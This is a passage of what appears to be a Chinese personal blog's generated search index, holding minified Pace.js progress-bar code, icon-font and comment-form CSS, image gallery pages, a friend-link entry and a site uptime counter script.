null==(c=this.bindings)[a]&&(c[a]=[]),this.bindings[a].push(b)},a}(),P=window.XMLHttpRequest,O=window.XDomainRequest,N=window.WebSocket,w=function(a,b){var c,d,e;e=[];for(d in b.prototype)try{e.push(null==a[d]&&"function"!=typeof b[d]?"function"==typeof Object.defineProperty?Object.defineProperty(a,d,{get:function(){return b.prototype[d]},configurable:!0,enumerable:!0}):a[d]=b.prototype[d]:void 0)}catch(f){c=f}return e},A=[],j.ignore=function(){var a,b,c;return b=arguments[0],a=2<=arguments.length?X.call(arguments,1):[],A.unshift("ignore"),c=b.apply(null,a),A.shift(),c},j.track=function(){var a,b,c;return b=arguments[0],a=2<=arguments.length?X.call(arguments,1):[],A.unshift("track"),c=b.apply(null,a),A.shift(),c},J=function(a){var b;if(null==a&&(a="GET"),"track"===A[0])return"force";if(!A.length&&D.ajax){if("socket"===a&&D.ajax.trackWebSockets)return!0;if(b=a.toUpperCase(),$.call(D.ajax.trackMethods,b)>=0)return!0}return!1},k=function(a){function b(){var a,c=this;b.__super__.constructor.apply(this,arguments),a=function(a){var b;return b=a.open,a.open=function(d,e){return J(d)&&c.trigger("request",{type:d,url:e,request:a}),b.apply(a,arguments)}},window.XMLHttpRequest=function(b){var c;return c=new P(b),a(c),c};try{w(window.XMLHttpRequest,P)}catch(d){}if(null!=O){window.XDomainRequest=function(){var b;return b=new O,a(b),b};try{w(window.XDomainRequest,O)}catch(d){}}if(null!=N&&D.ajax.trackWebSockets){window.WebSocket=function(a,b){var d;return d=null!=b?new N(a,b):new N(a),J("socket")&&c.trigger("request",{type:"socket",url:a,protocols:b,request:d}),d};try{w(window.WebSocket,N)}catch(d){}}}return Z(b,a),b}(h),R=null,y=function(){return null==R&&(R=new k),R},I=function(a){var b,c,d,e;for(e=D.ajax.ignoreURLs,c=0,d=e.length;d>c;c++)if(b=e[c],"string"==typeof b){if(-1!==a.indexOf(b))return!0}else if(b.test(a))return!0;return!1},y().on("request",function(b){var c,d,e,f,g;return f=b.type,e=b.request,g=b.url,I(g)?void 0:j.running||D.restartOnRequestAfter===!1&&"force"!==J(f)?void 0:(d=arguments,c=D.restartOnRequestAfter||0,"boolean"==typeof c&&(c=0),setTimeout(function(){var b,c,g,h,i,k;if(b="socket"===f?e.readyState<2:0<(h=e.readyState)&&4>h){for(j.restart(),i=j.sources,k=[],c=0,g=i.length;g>c;c++){if(K=i[c],K instanceof a){K.watch.apply(K,d);break}k.push(void 0)}return k}},c))}),a=function(){function a(){var a=this;this.elements=[],y().on("request",function(){return a.watch.apply(a,arguments)})}return a.prototype.watch=function(a){var b,c,d,e;return d=a.type,b=a.request,e=a.url,I(e)?void 0:(c="socket"===d?new n(b):new o(b),this.elements.push(c))},a}(),o=function(){function a(a){var b,c,d,e,f,g,h=this;if(this.progress=0,null!=window.ProgressEvent)for(c=null,a.addEventListener("progress",function(a){return h.progress=a.lengthComputable?100*a.loaded/a.total:h.progress+(100-h.progress)/2},!1),g=["load","abort","timeout","error"],d=0,e=g.length;e>d;d++)b=g[d],a.addEventListener(b,function(){return h.progress=100},!1);else f=a.onreadystatechange,a.onreadystatechange=function(){var b;return 0===(b=a.readyState)||4===b?h.progress=100:3===a.readyState&&(h.progress=50),"function"==typeof f?f.apply(null,arguments):void 0}}return a}(),n=function(){function a(a){var b,c,d,e,f=this;for(this.progress=0,e=["error","open"],c=0,d=e.length;d>c;c++)b=e[c],a.addEventListener(b,function(){return f.progress=100},!1)}return a}(),d=function(){function a(a){var b,c,d,f;for(null==a&&(a={}),this.elements=[],null==a.selectors&&(a.selectors=[]),f=a.selectors,c=0,d=f.length;d>c;c++)b=f[c],this.elements.push(new e(b))}return a}(),e=function(){function a(a){this.selector=a,this.progress=0,this.check()}return a.prototype.check=function(){var a=this;return document.querySelector(this.selector)?this.done():setTimeout(function(){return a.check()},D.elements.checkInterval)},a.prototype.done=function(){return this.progress=100},a}(),c=function(){function a(){var a,b,c=this;this.progress=null!=(b=this.states[document.readyState])?b:100,a=document.onreadystatechange,document.onreadystatechange=function(){return null!=c.states[document.readyState]&&(c.progress=c.states[document.readyState]),"function"==typeof a?a.apply(null,arguments):void 0}}return a.prototype.states={loading:0,interactive:50,complete:100},a}(),f=function(){function a(){var a,b,c,d,e,f=this;this.progress=0,a=0,e=[],d=0,c=C(),b=setInterval(function(){var g;return g=C()-c-50,c=C(),e.push(g),e.length>D.eventLag.sampleCount&&e.shift(),a=q(e),++d>=D.eventLag.minSamples&&a<D.eventLag.lagThreshold?(f.progress=100,clearInterval(b)):f.progress=100*(3/(a+3))},50)}return a}(),m=function(){function a(a){this.source=a,this.last=this.sinceLastUpdate=0,this.rate=D.initialRate,this.catchup=0,this.progress=this.lastProgress=0,null!=this.source&&(this.progress=F(this.source,"progress"))}return a.prototype.tick=function(a,b){var c;return null==b&&(b=F(this.source,"progress")),b>=100&&(this.done=!0),b===this.last?this.sinceLastUpdate+=a:(this.sinceLastUpdate&&(this.rate=(b-this.last)/this.sinceLastUpdate),this.catchup=(b-this.progress)/D.catchupTime,this.sinceLastUpdate=0,this.last=b),b>this.progress&&(this.progress+=this.catchup*a),c=1-Math.pow(this.progress/100,D.easeFactor),this.progress+=c*this.rate*a,this.progress=Math.min(this.lastProgress+D.maxProgressPerFrame,this.progress),this.progress=Math.max(0,this.progress),this.progress=Math.min(100,this.progress),this.lastProgress=this.progress,this.progress},a}(),L=null,H=null,r=null,M=null,p=null,s=null,j.running=!1,z=function(){return D.restartOnPushState?j.restart():void 0},null!=window.history.pushState&&(T=window.history.pushState,window.history.pushState=function(){return z(),T.apply(window.history,arguments)}),null!=window.history.replaceState&&(W=window.history.replaceState,window.history.replaceState=function(){return z(),W.apply(window.history,arguments)}),l={ajax:a,elements:d,document:c,eventLag:f},(B=function(){var a,c,d,e,f,g,h,i;for(j.sources=L=[],g=["ajax","elements","document","eventLag"],c=0,e=g.length;e>c;c++)a=g[c],D[a]!==!1&&L.push(new l[a](D[a]));for(i=null!=(h=D.extraSources)?h:[],d=0,f=i.length;f>d;d++)K=i[d],L.push(new K(D));return j.bar=r=new b,H=[],M=new m})(),j.stop=function(){return j.trigger("stop"),j.running=!1,r.destroy(),s=!0,null!=p&&("function"==typeof t&&t(p),p=null),B()},j.restart=function(){return j.trigger("restart"),j.stop(),j.start()},j.go=function(){var a;return j.running=!0,r.render(),a=C(),s=!1,p=G(function(b,c){var d,e,f,g,h,i,k,l,n,o,p,q,t,u,v,w;for(l=100-r.progress,e=p=0,f=!0,i=q=0,u=L.length;u>q;i=++q)for(K=L[i],o=null!=H[i]?H[i]:H[i]=[],h=null!=(w=K.elements)?w:[K],k=t=0,v=h.length;v>t;k=++t)g=h[k],n=null!=o[k]?o[k]:o[k]=new m(g),f&=n.done,n.done||(e++,p+=n.tick(b));return d=p/e,r.update(M.tick(b,d)),r.done()||f||s?(r.update(100),j.trigger("done"),setTimeout(function(){return r.finish(),j.running=!1,j.trigger("hide")},Math.max(D.ghostTime,Math.max(D.minTime-(C()-a),0)))):c()})},j.start=function(a){v(D,a),j.running=!0;try{r.render()}catch(b){i=b}return document.querySelector(".pace")?(j.trigger("start"),j.go()):setTimeout(j.start,50)},"function"==typeof define&&define.amd?define(["pace"],function(){return j}):"object"==typeof exports?module.exports=j:D.startOnPageLoad&&j.start()}).call(this);]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>标签页</title>
      <link href="/tags/index.html"/>
      <url>/tags/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/css/iconfont.css"/>
      <url>/css/iconfont.css</url>
      
        <content type="html"><![CDATA[@font-face {  font-family: "iconfont"; /* Project id 3612056 */  /* Color fonts */  src:        url('//at.alicdn.com/t/c/font_3612056_v5xkwntdg2.woff2?t=1678266598121') format('woff2'),       url('//at.alicdn.com/t/c/font_3612056_v5xkwntdg2.woff?t=1678266598121') format('woff'),       url('//at.alicdn.com/t/c/font_3612056_v5xkwntdg2.ttf?t=1678266598121') format('truetype');}.iconfont {  font-family: "iconfont" !important;  font-size: 16px;  font-style: normal;  -webkit-font-smoothing: antialiased;  -moz-osx-font-smoothing: grayscale;}.icon-biaoqian1:before {  content: "\e63d";}.icon-fenlei:before {  content: "\e62f";}.icon-dangan:before {  content: "\100fe";}.icon-shouye:before {  content: "\e631";}.icon-fangwu:before {  content: "\e603";}.icon-shijian:before {  content: "\e66c";}.icon-biaoqian:before {  content: "\e635";}.icon-wenjianjia:before {  content: "\e6b1";}.icon-shuben:before {  content: "\e7a2";}.icon-icon:before {  content: "\e694";}.icon-tupian1:before {  content: "\e67f";}.icon-tupian:before {  content: "\e645";}.icon-bilibili-fill:before {  content: "\e66b";}.icon-icon_bilibili:before {  content: "\e601";}.icon-bilibili-line:before {  content: "\e66d";}.icon-yun:before {  content: "\eb2c";}.icon-yun1:before {  content: "\e60b";}.icon-kafei:before {  content: "\e660";}.icon-xinxi:before {  content: "\e641";}.icon-home:before {  content: "\e699";}.icon-folder:before {  content: "\e650";}.icon-tags:before {  content: "\e685";}.icon-aixin:before {  content: "\e602";}.icon-qq:before {  content: "\e600";}.icon-QQ1:before {  content: "\e667";}.icon-shijianzhou:before {  content: "\e61b";}.icon-QQ:before {  content: "\e65e";}.icon-email:before {  content: "\e6eb";}.icon-github:before {  content: "\ea0b";}.icon-bilibili:before {  content: "\e609";}]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/css/twikoo.css"/>
      <url>/css/twikoo.css</url>
      
        <content type="html"><![CDATA[/* 设置文字内容 :nth-child(1)的作用是选择第几个 */.el-input.el-input--small.el-input-group.el-input-group--prepend:nth-child(1):before {    content: '输入QQ号会自动获取昵称和头像🐧';}.el-input.el-input--small.el-input-group.el-input-group--prepend:nth-child(2):before {    content: '收到回复将会发送到您的邮箱📧';}.el-input.el-input--small.el-input-group.el-input-group--prepend:nth-child(3):before {    content: '可以通过昵称访问您的网站🔗';}/* 当用户点击输入框时显示 */.el-input.el-input--small.el-input-group.el-input-group--prepend:focus-within::before,.el-input.el-input--small.el-input-group.el-input-group--prepend:focus-within::after {    display: block;}/* 主内容区 */.el-input.el-input--small.el-input-group.el-input-group--prepend::before {    /* 先隐藏起来 */    display: none;    /* 绝对定位 */    position: absolute;    /* 向上移动60像素 */    top: -60px;    /* 文字强制不换行，防止left:50%导致的文字换行 */    white-space: nowrap;    /* 圆角 */    border-radius: 10px;    /* 距离左边50% */    left: 50%;    /* 然后再向左边挪动自身的一半，即可实现居中 */    transform: translate(-50%);    /* 填充 */    padding: 14px 18px;    background: #444;    color: #fff;}/* 小角标 */.el-input.el-input--small.el-input-group.el-input-group--prepend::after {    display: none;    content: '';    position: absolute;    /* 内容大小（宽高）为0且边框大小不为0的情况下，每一条边（4个边）都是一个三角形，组成一个正方形。    我们先将所有边框透明，再给其中的一条边添加颜色就可以实现小三角图标 */    border: 12px solid transparent;    border-top-color: #444;    left: 50%;    transform: translate(-50%, -48px);}]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>必应精选</title>
      <link href="/wallpaper1/index.html"/>
      <url>/wallpaper1/index.html</url>
      
        <content type="html"><![CDATA[<div class="fj-gallery"><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/%E5%B0%81%E9%9D%A2/%E5%B0%81%E9%9D%A21.png" alt=""></p><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/%E5%B0%81%E9%9D%A2/%E5%B0%81%E9%9D%A24.png" alt=""></p><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/%E5%B0%81%E9%9D%A2/FM10.jpg" alt=""></p><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/banner.jpg" alt="banner"></p><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/th.jpg" alt="th"></p>          </div>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>时间轴</title>
      <link href="/timeline/index.html"/>
      <url>/timeline/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>动漫壁纸</title>
      <link href="/wallpaper/index.html"/>
      <url>/wallpaper/index.html</url>
      
        <content type="html"><![CDATA[<div class="fj-gallery"><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/%E5%B0%81%E9%9D%A2/%E5%B0%81%E9%9D%A22.png" style="zoom:200%;" /></p><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/%E5%B0%81%E9%9D%A2/%E5%B0%81%E9%9D%A23.png" style="zoom:200%;" /></p><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/%E5%B0%81%E9%9D%A2/%E5%B0%81%E9%9D%A25.png" style="zoom:200%;" /></p><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/%E5%B0%81%E9%9D%A2/%E5%B0%81%E9%9D%A26.png" style="zoom:200%;" /></p><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/%E5%B0%81%E9%9D%A2/FM7.png" style="zoom:200%;" /></p><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/%E5%B0%81%E9%9D%A2/FM11.png" style="zoom:200%;" /></p><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/%E5%B0%81%E9%9D%A2/FM13.jpg" style="zoom:200%;" /></p><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/%E5%B0%81%E9%9D%A2/FM12.png" style="zoom:200%;" /></p>          </div>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/link/index.html"/>
      <url>/link/index.html</url>
      
        <content type="html"><![CDATA[<hr><h2 id="我的友链"><a href="#我的友链" class="headerlink" title="我的友链"></a>我的友链</h2><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">-</span> <span class="attr">name:</span> <span class="string">南柯一梦</span></span><br><span class="line">      <span class="attr">link:</span> <span class="string">https://nankym.cn/</span></span><br><span class="line">      <span class="attr">avatar:</span> <span class="string">https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/touxiang1.jpg</span></span><br><span class="line">      <span class="attr">descr:</span> <span class="string">捕捉温柔，忙于快乐</span></span><br></pre></td></tr></table></figure>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/js/runtime/runtime.js"/>
      <url>/js/runtime/runtime.js</url>
      
        <content type="html"><![CDATA[var now = new Date; function createtime() { var grt = new Date("08/10/2022 00:00:00"); now.setTime(now.getTime() + 250); var days = (now - grt) / 1e3 / 60 / 60 / 24, dnum = Math.floor(days), hours = (now - grt) / 1e3 / 60 / 60 - 24 * dnum, hnum = Math.floor(hours); 1 == String(hnum).length && (hnum = "0" + hnum); var minutes = (now - grt) / 1e3 / 60 - 1440 * dnum - 60 * hnum, mnum = Math.floor(minutes); 1 == String(mnum).length && (mnum = "0" + mnum); var seconds = (now - grt) / 1e3 - 86400 * dnum - 3600 * hnum - 60 * mnum, snum = Math.round(seconds); 1 == String(snum).length && (snum = "0" + snum); let currentTimeHtml = ""; currentTimeHtml = hnum < 19 && hnum >= 10 ? `<img class='boardsign' src='/img/小时-上班中.svg' title='距离月入25k也就还差一个大佬带我~'><span class='textTip'> <br> 本站居然运行了 ${dnum} 天</span><span id='runtime'> ${hnum} 小时 ${mnum} 分 ${snum} 秒 </span> <i class='fas fa-heartbeat' style='color:red'></i>` : `<img class='boardsign' src='/img/小时-下班啦.svg' title='下班了就该开开心心的玩耍，嘿嘿~'><span class='textTip'> <br> 本站居然运行了 ${dnum} 天</span><span id='runtime'> ${hnum} 小时 ${mnum} 分 ${snum} 秒 </span> <i class='fas fa-heartbeat' style='color:red'></i>`, document.getElementById("workboard") && (document.getElementById("workboard").innerHTML = currentTimeHtml) } setInterval(() => { createtime() }, 250);]]></content>
      
    </entry>
    
    
  
</search>
